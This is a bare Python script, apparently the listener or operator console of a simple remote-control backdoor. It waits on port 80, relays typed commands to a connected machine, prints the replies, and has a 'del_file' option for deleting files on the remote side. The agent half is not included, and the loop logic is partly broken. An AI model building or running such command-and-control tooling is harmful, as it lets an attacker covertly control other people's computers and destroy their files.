import socket,subprocess,time


def Server():
    host = "localhost"
    port = 80

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))

    s.listen(1)
    conn, addr = s.accept()
    print("Connection from: " + str(addr))
    while True:
        message = input("->")
        while message != "q":
            conn.send(message.encode())
            data = conn.recv(16834).decode()
            print(data)
            if message == "q":
                conn.close()
            else:
                pass

            if data == "del_file":
                del_file = input("The file name you want to del: ")
                conn.send(del_file.encode())
                time.sleep(.2)
                data = conn.recv(16834).decode()
                print(data)
            message = input("->")
            
    conn.close()
    time.sleep(5)
    Server()


if __name__ == '__main__':
    print("Waiting a host...")
    Server()
